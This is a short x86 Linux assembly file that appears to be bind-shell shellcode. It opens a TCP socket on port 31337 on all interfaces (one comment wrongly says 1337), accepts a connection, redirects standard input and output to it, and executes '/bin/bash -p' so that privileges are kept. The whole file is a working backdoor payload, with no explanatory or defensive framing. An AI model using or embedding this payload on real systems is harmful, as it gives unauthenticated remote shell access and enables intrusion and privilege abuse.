.global _start
_start:
	push $0x66
	pop %eax # sockcall()
	cdq

	xor %ebx, %ebx
	inc %ebx # SYS_SOCKET

	push %edx
	push %ebx
	push $0x02

	mov %esp, %ecx # args = {2 , 1 , 0} AF_INET, SOCK_STREAM, 0
	int $0x80 # socket(AF_INET, SOCK_STREAM, 0);

	mov %eax, %esi
	push $0x66
	pop %eax # sockcall()

	inc %ebx # SYS_BIND

	push %edx
	pushw $0x697a
	pushw %bx 
	
	mov %esp, %ecx # {AF_INET, 31337, INADDR_ANY}

	push $0x10
	push %ecx
	push %esi 
	mov %esp, %ecx # args = {fd, &sockaddr_in, 16}

	int $0x80 # bind(fd, {AF_INET, 1337, INADDR_ANY}, 16)

	push $0x66	
	pop %eax # sockcall()
	
	inc %ebx
	inc %ebx # SYS_LISTEN
	
	push %ebx	
	push %esi
	mov %esp, %ecx # args = {fd, 4}

	int $0x80 # listen(fd, 4)

	push $0x66	
	pop %eax # sockcall()
	
	inc %ebx # SYS_ACCEPT

	push %edx
	push %edx
	push %esi
	mov %esp, %ecx # args = {fd, NULL, NULL}

	int $0x80 # accept(fd, NULL, NULL)

	mov %eax, %ebx 

	push $0x3f
	pop %eax # dup2

	mov %edx, %ecx
	
	int $0x80 # dup2(fd, 0)

	push $0x3f
	pop %eax # dup2

	inc %ecx
	
	int $0x80 # dup2(fd, 1)

	push $0x3f
	pop %eax # dup2

	inc %ecx
	
	int $0x80 # dup2(fd, 2)

	push $0x0b
	pop %eax # execve
	
	push %edx
	push $0x68
	push $0x7361622f
	push $0x6e69622f

	mov %esp, %ebx # /bin/bash

	push %edx
	pushw $0x702d 
	mov %esp, %ecx # -p

	push %edx
	push %ecx
	push %ebx
	mov %esp, %ecx # argv

	int $0x80 # execve("/bin/bash", argv, NULL)
